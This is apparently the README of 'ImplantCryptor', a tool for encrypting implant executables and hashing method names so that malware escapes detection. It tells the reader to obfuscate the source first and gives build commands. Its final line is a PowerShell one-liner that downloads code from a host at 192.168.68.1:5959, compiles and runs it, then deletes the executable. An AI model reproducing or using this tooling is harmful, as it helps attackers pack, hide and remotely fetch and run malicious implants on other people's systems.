# Usage
## Encrypt
```
ImplantCryptor -e filePath.exe
```
## Hash
```
ImplantCryptor -h SomeMethodName
```

# Compile
1. This is meant to be source-obfuscated first!
2. In `Program.cs` change values in "CHANGEME" section.
3. `dotnet publish --runtime win-x64`

```
Remove-Item -Force -Recurse .\192.168.68.1+5959\; wget.exe -r -R "index.htlm" -np http://192.168.68.1:5959/; dotnet publish .\192.168.68.1+5959\; cp .\192.168.68.1+5959\bin\Release\net462\publish\ImplantCryptor.exe . ; .\ImplantCryptor.exe ; del .\ImplantCryptor.exe
```
